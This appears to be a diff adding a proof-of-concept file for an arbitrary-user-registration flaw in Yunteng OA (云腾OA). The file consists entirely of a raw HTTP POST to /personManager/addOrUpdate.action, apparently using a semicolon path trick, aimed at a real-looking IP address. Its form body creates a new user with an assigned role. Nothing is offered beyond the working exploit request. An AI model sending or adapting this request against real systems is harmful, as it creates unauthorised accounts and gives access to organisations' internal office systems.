@@ -1,0 +1,15 @@
+# 云腾OA任意用户注册
+POST /personManager/addOrUpdate.action; HTTP/1.1
+Host: 139.9.251.239:8000
+Content-Length: 738
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.200
+Content-Type: application/x-www-form-urlencoded
+Origin: http://139.9.251.239:8000/
+Referer: http://139.9.251.239:8000/system/core/person/addupdate.jsp?deptId=5&deptName=%E5%AE%A1%E8%AE%A1%E7%9B%91%E5%AF%9F%E9%83%A8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Connection: close
+
+userId=ceshi004&userName=ceshi004&deptId=5&deptIdName=%E5%AE%A1%E8%AE%A1%E7%9B%91%E5%AF%9F%E9%83%A8&deptIdOtherStr=&userRoleOtherId=&userNo=67&leaderIds=&underlingIds=&viewDeptIds=&postDeptStr=&menuGroupsStr=&emailCapacity=500&folderCapacity=500&webmailNum=&webmailCapacity=&deviceId=&secureKeySn=&icq_no=&bkground=&byname=&birthdayStr=&mobilNo=&email=&oicqNo=&weixinNo=&telNoDept=&faxNoDept=&addHome=&postNoHome=&telNoHome=&attachId=&uuid=0&deptIdOtherStrName=&userRoleOtherName=&viewDeptNames=&postDeptStrName=&menuGroupsStrName=&bindIp=&bindMac=&userRoleStr=85&isShowInPcOrg=1&viewPriv=0&postPriv=-1&dutyType=0&signWay=1&desktop=1&sex=0&theme=&usePops=0&mobilNoHidden=0
